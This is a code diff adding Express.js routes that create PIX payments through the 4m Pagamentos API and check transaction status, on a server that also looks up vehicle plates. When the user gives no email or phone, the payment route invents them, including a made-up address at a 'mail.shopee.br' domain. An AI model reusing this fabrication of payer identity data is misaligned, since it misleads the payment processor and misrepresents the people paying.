@@ -195,6 +195,159 @@ app.get('/api/vehicle-info/:placa', async (req, res) => {
   }
 });
 
+// Criar pagamento PIX via 4m Pagamentos
+app.post('/api/payments/pix', async (req, res) => {
+  try {
+    const { name, cpf, email, phone, amount, description } = req.body;
+    
+    console.log('[PAYMENT] Recebida requisição de pagamento PIX:', {
+      name,
+      cpf: cpf?.substring(0, 3) + '***',
+      amount
+    });
+    
+    // Validação básica
+    if (!name || !cpf) {
+      return res.status(400).json({ error: 'Nome e CPF são obrigatórios' });
+    }
+    
+    // Verificar se a API 4m Pagamentos está configurada
+    if (!process.env.FOUR_M_PAGAMENTOS_API_KEY) {
+      console.error('[PAYMENT] FOUR_M_PAGAMENTOS_API_KEY não configurada');
+      return res.status(500).json({
+        error: 'Serviço de pagamento não configurado. Configure a chave de API 4m Pagamentos.',
+      });
+    }
+    
+    // Formatar CPF (remover caracteres não numéricos)
+    const cleanCpf = cpf.replace(/\D/g, '');
+    
+    // Formatar telefone (remover caracteres não numéricos)
+    const cleanPhone = phone ? phone.replace(/\D/g, '') : `11${Math.floor(Math.random() * 1000000000).toString().padStart(9, '0')}`;
+    
+    // Usar valor fornecido ou padrão
+    const paymentAmount = amount || 79.90;
+    
+    // Usar email fornecido ou gerar um
+    const userEmail = email || `${name.toLowerCase().replace(/\s+/g, '.')}.${Date.now()}@mail.shopee.br`;
+    
+    // Formatar amount como string com 2 casas decimais
+    const formattedAmount = typeof paymentAmount === 'number' 
+      ? paymentAmount.toFixed(2) 
+      : parseFloat(paymentAmount).toFixed(2);
+    
+    // Preparar dados para a API 4m Pagamentos
+    const paymentData = {
+      amount: formattedAmount,
+      customer_name: name,
+      customer_email: userEmail,
+      customer_cpf: cleanCpf,
+      customer_phone: cleanPhone,
+      description: description || 'Pagamento via PIX'
+    };
+    
+    console.log('[PAYMENT] Enviando dados para 4m Pagamentos API');
+    
+    // Chamar API 4m Pagamentos
+    const apiResponse = await fetch('https://app.4mpagamentos.com/api/v1/payments', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'Authorization': `Bearer ${process.env.FOUR_M_PAGAMENTOS_API_KEY}`,
+        'Accept': 'application/json'
+      },
+      body: JSON.stringify(paymentData)
+    });
+    
+    if (!apiResponse.ok) {
+      const errorData = await apiResponse.json().catch(() => ({}));
+      console.error('[PAYMENT] Erro da API 4m Pagamentos:', errorData);
+      return res.status(apiResponse.status).json({
+        error: errorData.error || 'Erro ao processar pagamento',
+        details: errorData
+      });
+    }
+    
+    const apiResult = await apiResponse.json();
+    console.log('[PAYMENT] Pagamento criado com sucesso');
+    
+    // A API retorna { success: true, data: {...} }
+    const transaction = apiResult.data || apiResult;
+    
+    // Verificar se os campos necessários estão presentes
+    if (!transaction.pix_code || !transaction.pix_qr_code) {
+      throw new Error('Resposta da API não contém os dados PIX necessários');
+    }
+    
+    // Retornar resposta formatada
+    const result = {
+      id: transaction.id.toString(),
+      transactionId: transaction.transaction_id,
+      pixCode: transaction.pix_code,
+      pixQrCode: transaction.pix_qr_code,
+      amount: transaction.amount,
+      status: transaction.status || 'pending',
+      expiresAt: transaction.expires_at || null,
+      createdAt: transaction.created_at
+    };
+    
+    res.status(200).json(result);
+    
+  } catch (error) {
+    console.error('[PAYMENT] Erro ao processar pagamento:', error.message);
+    res.status(500).json({ 
+      error: error.message || 'Falha ao processar pagamento.'
+    });
+  }
+});
+
+// Verificar status de pagamento (endpoint público da 4m Pagamentos)
+app.get('/api/payments/status/:transactionId', async (req, res) => {
+  try {
+    const { transactionId } = req.params;
+    
+    if (!transactionId) {
+      return res.status(400).json({ error: 'ID da transação não fornecido' });
+    }
+    
+    console.log(`[PAYMENT] Verificando status da transação: ${transactionId}`);
+    
+    // Endpoint público - não requer autenticação
+    const response = await fetch(
+      `https://app.4mpagamentos.com/api/v1/transactions/${transactionId}`,
+      {
+        method: 'GET',
+        headers: {
+          'Accept': 'application/json'
+        }
+      }
+    );
+    
+    if (!response.ok) {
+      return res.status(response.status).json({
+        error: 'Erro ao verificar status do pagamento'
+      });
+    }
+    
+    const statusData = await response.json();
+    
+    res.status(200).json({
+      id: statusData.id,
+      transactionId: statusData.transactionId,
+      status: statusData.status,
+      amount: statusData.amount,
+      createdAt: statusData.createdAt,
+      paidAt: statusData.paidAt
+    });
+    
+  } catch (error) {
+    console.error('[PAYMENT] Erro ao verificar status:', error.message);
+    res.status(500).json({ 
+      error: error.message || 'Erro ao verificar status do pagamento'
+    });
+  }
+});
+
 // Catch-all para APIs não encontradas
 app.use('/api/*', (req, res) => {
   res.status(404).json({
